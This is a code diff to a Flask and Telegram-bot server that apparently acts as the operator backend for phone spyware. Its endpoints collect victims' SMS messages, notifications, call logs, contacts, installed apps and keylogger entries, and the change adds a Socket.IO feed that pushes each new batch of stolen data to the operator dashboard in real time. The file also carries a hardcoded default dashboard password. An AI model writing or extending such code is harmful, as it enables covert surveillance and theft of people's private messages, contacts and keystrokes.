@@ -14,6 +14,7 @@ import urllib.request
 from urllib.parse import quote
 from datetime import datetime
 from flask import Flask, render_template, request, jsonify, session, redirect, url_for
+from flask_socketio import SocketIO, emit
 from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
@@ -405,6 +406,35 @@ app.secret_key = os.environ.get("SECRET_KEY", hashlib.md5(f"hermes{time.time()}"
 app.permanent_session_lifetime = 3600  # 1 jam
 DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "Kosay378%")
 
+# ============ REAL-TIME (Socket.IO) ============
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
+SOCKET_CLIENTS = set()
+
+@socketio.on("connect")
+def handle_connect():
+    sid = request.sid
+    SOCKET_CLIENTS.add(sid)
+    print(f"[WS] Client connected: {sid}")
+
+@socketio.on("disconnect")
+def handle_disconnect():
+    sid = request.sid
+    SOCKET_CLIENTS.discard(sid)
+    print(f"[WS] Client disconnected: {sid}")
+
+@socketio.on("auth")
+def handle_auth(data):
+    """Authenticate WebSocket — client must send password"""
+    if data.get("password") == DASHBOARD_PASSWORD:
+        emit("auth_ok", {"status": "authenticated"})
+        print(f"[WS] Client authenticated: {request.sid}")
+    else:
+        emit("auth_error", {"error": "Invalid password"})
+
+def broadcast_data(data_type, data):
+    """Send real-time update to all authenticated WebSocket clients"""
+    socketio.emit("update", {"type": data_type, "data": data})
+
 # ============ DASHBOARD AUTH ============
 def login_required(f):
     from functools import wraps
@@ -514,6 +544,7 @@ def api_collect_sms():
             ts_iso = received
         db_exec("INSERT INTO sms_log (sender, message, timestamp, device_id, received_at) VALUES (?,?,?,?,?)",
                 (sender, message, ts_iso, device_id, received))
+        broadcast_data("sms", {"device_id": device_id, "time": datetime.now().isoformat()})
         return jsonify({"success": True})
     except Exception as e:
         print(f"SMS collect error: {e}")
@@ -543,6 +574,7 @@ def api_collect_notif():
             ts_iso = received
         db_exec("INSERT INTO notif_log (sender, message, timestamp, device_id, app, received_at) VALUES (?,?,?,?,?,?)",
                 (sender, message, ts_iso, device_id, app_name, received))
+        broadcast_data("notification", {})
         return jsonify({"success": True})
     except Exception as e:
         print(f"Notif collect error: {e}")
@@ -567,6 +599,7 @@ def api_collect_call_logs(device_id):
             count += 1
         db_exec("INSERT OR REPLACE INTO device_status (device_id, last_seen, status, info) VALUES (?,?,?,?)",
                 (device_id, received, "active", json.dumps({"calls_synced": count})))
+        broadcast_data("calls", {"device_id": device_id, "count": count})
         return jsonify({"success": True, "count": count})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)})
@@ -588,6 +621,7 @@ def api_collect_contacts(device_id):
             db_exec("INSERT INTO contacts (device_id, name, phone_number, email, source, timestamp, received_at) VALUES (?,?,?,?,?,?,?)",
                     (device_id, name, number, email, source, ts, received))
             count += 1
+        broadcast_data("contacts", {"device_id": device_id, "count": count})
         return jsonify({"success": True, "count": count})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)})
@@ -628,6 +662,7 @@ def api_collect_apps(device_id):
                 db_exec("INSERT INTO app_usage_log (device_id, package, class_name, timestamp, received_at) VALUES (?,?,?,?,?)",
                         (device_id, pkg, f"INSTALLED:{name} v{version}", ts, received))
                 count += 1
+        broadcast_data("apps", {"device_id": device_id, "count": count})
         return jsonify({"success": True, "count": count})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)})
@@ -921,6 +956,7 @@ def api_keylog(device_id):
         db_exec("INSERT OR REPLACE INTO device_status (device_id, last_seen, status, info) VALUES (?,?,?,?)",
                 (device_id, received, "keylog_active", json.dumps({"entries": count})))
         
+        broadcast_data("keylog", {"device_id": device_id, "count": count, "time": datetime.now().isoformat()})
         return jsonify({"success": True, "count": count})
     except Exception as e:
         print(f"Keylog error: {e}")
@@ -1308,8 +1344,8 @@ def main():
     init_db()
     from threading import Thread
 
-    # Start Flask web server in daemon thread
-    Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False), daemon=True).start()
+    # Start Flask web server with Socket.IO (daemon thread)
+    Thread(target=lambda: socketio.run(app, host="0.0.0.0", port=5000, debug=False, use_reloader=False, allow_unsafe_werkzeug=True), daemon=True).start()
     print("🌐 Web server :5000")
 
     # Build bot
